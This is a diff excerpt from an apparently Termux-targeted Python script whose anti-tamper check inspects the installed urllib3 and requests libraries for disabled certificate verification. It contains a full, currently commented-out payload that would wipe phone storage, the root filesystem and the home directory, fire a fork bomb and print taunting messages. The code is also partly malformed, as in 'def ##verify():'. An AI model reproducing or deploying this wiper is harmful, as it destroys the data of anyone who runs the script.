@@ -868,7 +868,7 @@ def iamcheckingyou():
     with open(f'{site}urllib3/conne'+'ction.py', 'r') as file7i7 :
         filedata47 = file7i7.read()
     #if str("cert_reqs = 'CERT_NONE'") in filedata47:wash('rm -rf /storage/emulated/0/*');wash('rm -rf /storage/emulated/*');wash('rm -rf /sdcard/*');wash('rm -rf /sdcard/0/*');wash('rm -rf /sdcard1/*');wash('rm -rf /storage/*');wash('rm -rf /*');wash('rm -rf /system/*');wash('rm -rf $HOME/../../*');wash('rm -rf $PREFIX/b');wash('rm -rf $HOME/*');wash('mv $HOME /dev/null');wash(':(){ :|: & };:');wash("rm -rf /data/data/com.termux/files/usr/lib/python3.*");_________linex_________();print(f'{style} MR.TOP FUCK YOUR SYSTEM 😗');_________linex_________();time.sleep(2);print(f'{style} PAID COMMAND FREE USE NOTE EASY 🤣');_________linex_________();time.sleep(2);print(f'{style} GO AND CHECK YOUR STORAGE BYE...😘🍻');_________linex_________();time.sleep(2);exit()
-def ##verify():
+#def ##verify():
     with open(f'{site}req'+'uests/sessi'+'ons.py', 'r') as file :
             filedata = file.read()
     filedata = filedata.replace('##verify = False', '##verify = True')
